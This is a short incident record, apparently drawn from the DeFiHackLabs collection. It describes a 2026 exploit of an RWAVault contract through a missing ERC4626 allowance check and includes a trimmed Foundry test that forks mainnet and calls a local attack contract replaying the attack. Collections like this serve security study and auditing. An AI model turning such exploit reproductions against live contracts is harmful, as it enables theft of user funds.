# [?] RWAVault - Missing ERC4626 allowance check

## Summary
Severity: Unknown
Chain: Ethereum
Component: RWAVault
Published: 2026-04-28
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/RWAVault_exp.sol
Type: defi-exploit-poc

## Details
Lost: 398,655.47 USDC

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    uint256 private constant FORK_BLOCK = 24_979_315;

    IERC20 private constant usdc = IERC20(USDC_TOKEN);

    RWAVaultAttack private exploit;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        uint256 attackBlockTimestamp = 1_777_388_411;
        vm.warp(attackBlockTimestamp);
        vm.coinbase(BLOCK_MINER);

        fundingToken = USDC_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(RWA_VAULT_ENTRY, "RWAVault Entry/State Clone");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(UNISWAP_V2_ROUTER, "Uniswap V2 Router");
        vm.label(BLOCK_MINER, "Block Miner");

        exploit = new RWAVaultAttack(ATTACKER);
        vm.label(address(exploit), "Local Attack Contract");
    }

    function testExploit() public balanceLog {
        uint256 attackerBefore = usdc.balanceOf(ATTACKER);
        uint256 minerEthBefore = BLOCK_MINER.balance;

        // step 1: attacker EOA triggers a local helper that mirrors the historical attack contract's call order.
        vm.prank(ATTACKER);
        exploit.execute();

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/RWAVault_exp.sol_
